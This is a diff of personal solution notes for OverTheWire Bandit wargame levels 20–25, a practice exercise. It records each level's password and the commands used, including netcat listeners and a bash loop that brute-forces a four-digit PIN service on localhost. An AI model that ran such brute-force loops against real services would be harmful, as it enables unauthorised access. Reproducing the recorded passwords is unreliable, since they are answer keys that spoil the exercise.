@@ -196,10 +196,11 @@ bandit20:4pIjcunZ0fK2vmp3IwfG8Vf7VhxD6pOA
 ls -l
 #total 16
 #-rwsr-x--- 1 bandit21 bandit20 15604 Jun 24 14:58 suconnect
-bandit20@bandit:~$ echo "4pIjcunZ0fK2vmp3IwfG8Vf7VhxD6pOA" | nc -l -p 9091
+#bandit20@bandit:~$ echo "4pIjcunZ0fK2vmp3IwfG8Vf7VhxD6pOA" | nc -l -p 9091
 #In another terminal logged in as bandit20
-bandit20@bandit:~$ ./suconnect 9091
+#bandit20@bandit:~$ ./suconnect 9091
 bandit21:bW9kBv5WC3P4yoDyf12LSdGuNz5ka6hY
+
 #########################################
 #level 21
 cat /usr/bin/cronjob_bandit22.sh
@@ -333,4 +334,17 @@ chmod 777 -R /tmp/temp
 #-r-------- 1 bandit24 bandit24 33 Jun 24 14:58 /etc/bandit_pass/bandit24
 
 bandit24:hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
+#################################
+# level 24
+netcat localhost 30002
 
+#I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+
+# brute force
+##!/bin/bash
+#
+#for i in {0000..9999}; do
+#        echo "hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv $i"; done| nc -w 1 localhost 30002
+bandit25:SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
+############################################
+#level 25
